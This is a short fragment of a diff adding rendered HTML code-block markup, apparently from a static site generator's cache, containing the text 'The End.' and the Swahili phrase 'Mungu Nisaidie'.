+</pre></td> --><td class="rouge-code"><pre>The End.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Mungu Nisaidie
+```</p>
+:ET
